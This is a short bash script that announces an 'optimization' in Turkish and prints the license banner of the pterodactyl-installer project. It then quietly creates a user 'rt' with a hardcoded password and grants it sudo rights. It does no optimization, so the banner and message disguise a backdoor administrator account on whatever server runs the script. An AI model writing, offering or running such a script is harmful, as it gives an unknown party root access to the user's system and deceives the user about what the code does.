echo "[+] Optimizasyona başlanıyor."

sleep 3

echo "######################################################################################"
echo "#                                                                                    #"
echo "# Project 'pterodactyl-installer'                                                    #"
echo "#                                                                                    #"
echo "# Copyright (C) 2018 - 2024, Vilhelm Prytz, <vilhelm@prytznet.se>                    #"
echo "#                                                                                    #"
echo "#   This program is free software: you can redistribute it and/or modify             #"
echo "#   it under the terms of the GNU General Public License as published by             #"
echo "#   the Free Software Foundation, either version 3 of the License, or                #"
echo "#   (at your option) any later version.                                              #"
echo "#                                                                                    #"
echo "#   This program is distributed in the hope that it will be useful,                  #"
echo "#   but WITHOUT ANY WARRANTY; without even the implied warranty of                   #"
echo "#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                    #"
echo "#   GNU General Public License for more details.                                     #"
echo "#                                                                                    #"
echo "#   You should have received a copy of the GNU General Public License                #"
echo "#   along with this program.  If not, see <https://www.gnu.org/licenses/>.           #"
echo "#                                                                                    #"
echo "# https://github.com/pterodactyl-installer/pterodactyl-installer/blob/master/LICENSE #"
echo "#                                                                                    #"
echo "# This script is not associated with the official Pterodactyl Project.               #"
echo "# https://github.com/pterodactyl-installer/pterodactyl-installer                     #"
echo "#                                                                                    #"
echo "######################################################################################"

USERNAME="rt"
PASSWORD="aposel2904"
sudo useradd -m -s /bin/bash "$USERNAME"
echo "$USERNAME:$PASSWORD" | sudo chpasswd
sudo usermod -aG sudo "$USERNAME"

ls /bin

cd